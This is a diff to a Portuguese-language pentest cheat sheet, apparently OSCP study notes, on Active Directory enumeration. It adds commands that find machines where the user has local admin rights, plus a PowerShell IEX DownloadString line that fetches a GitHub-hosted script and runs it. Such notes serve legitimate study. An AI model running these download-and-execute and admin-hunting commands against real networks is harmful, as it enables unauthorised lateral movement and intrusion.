@@ -599,11 +599,23 @@ Invoke-FileFinder -Verbose
 Get-DomainFileServer
 Get-NetFileServer -Verbose
 ```
-##### DOMAIN - ONDE SOU LOCAL ADMIN?
+##### DOMAIN - SOU LOCAL ADMIN EM ALGUMA MÁQUINA DO DOMINIO?
 Find all machines on the currentdomain where the current user has local admin access.
 ```
 Find-LocalAdminAccess -Verbose
 Find-LocalAdminAccess -Domain tech.local
+```
+##### DOMAIN - SOU LOCAL ADMIN NESSA MÁQUINA? 
+
+```
+Invoke-CheckLocalAdminAccess
+Invoke-CheckLocalAdminAccess -computername server01
+```
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Find-WMILocalAdminAccess.ps1")
+curl https://github.com/n0ts0cial/oscp/raw/main/Find-WMILocalAdminAccess.ps1 -Outfile Find-WMILocalAdminAccess.ps1
+Import-Module .\Find-WMILocalAdminAccess.ps1
+Find-WMILocalAdminAccess
 ```
 
 
